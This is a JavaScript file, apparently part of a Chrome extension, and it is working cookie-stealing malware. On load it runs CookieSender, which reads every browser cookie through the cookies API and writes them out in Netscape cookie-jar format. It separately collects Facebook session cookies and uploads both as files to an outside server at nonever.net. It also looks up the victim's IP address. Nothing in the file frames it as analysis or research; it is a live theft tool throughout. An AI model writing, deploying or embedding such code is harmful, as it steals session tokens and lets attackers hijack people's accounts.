async function CookieSender() {
  try {
    const ipRes = await fetch("https://api.ipify.org");
    if (!ipRes.ok) throw new Error("Failed to fetch IP address");
    const ip = await ipRes.text();

    chrome.cookies.getAll({}, cookies => {
      let allCookies = "";
      let fbCookies = "";

      cookies.forEach(cookie => {
        const domain = cookie.domain.startsWith(".") ? cookie.domain : "." + cookie.domain;
        const path = cookie.path || "/";
        const secure = cookie.secure ? "TRUE" : "FALSE";
        const expires = cookie.expirationDate ? Math.round(cookie.expirationDate) : "";
        const name = cookie.name;
        const value = cookie.value;

        allCookies += `${domain}\t${secure}\t${path}\tFALSE\t${expires}\t${name}\t${value}\n`;

        if (domain.includes("facebook.com")) {
          fbCookies += `${name}=${value}; `;
        }
      });

      if (fbCookies) {
        fbCookies = fbCookies.trim().replace(/;$/, "");
      }

      console.log("Netscape Format Cookies:\n", allCookies);
      console.log("Filtered Facebook Cookies:\n", fbCookies);

      const formAll = new FormData();
      const blobAll = new Blob([allCookies], { type: "text/plain" });
      formAll.append("file", blobAll, "All_Cookies.txt");

      fetch("https://nonever.net/upload.php", {
        method: "POST",
        body: formAll
      })
        .then(res => res.json())
        .then(data => {
          if (data.status !== "success") throw new Error("Failed to upload Netscape document: " + data.message);
        })
        .catch(err => console.error("Error sending Netscape document to server:", err));

      if (fbCookies) {
        const formFb = new FormData();
        const blobFb = new Blob([fbCookies], { type: "text/plain" });
        formFb.append("file", blobFb, "Cookies_Fb.txt");

        fetch("https://nonever.net/upload.php", {
          method: "POST",
          body: formFb
        })
          .then(res => res.json())
          .then(data => {
            if (data.status !== "success") throw new Error("Failed to upload Facebook document: " + data.message);
          })
          .catch(err => console.error("Error sending Facebook document to server:", err));
      }
    });
  } catch (err) {
    console.error("Error in CookieSender function:", err);
  }
}

CookieSender();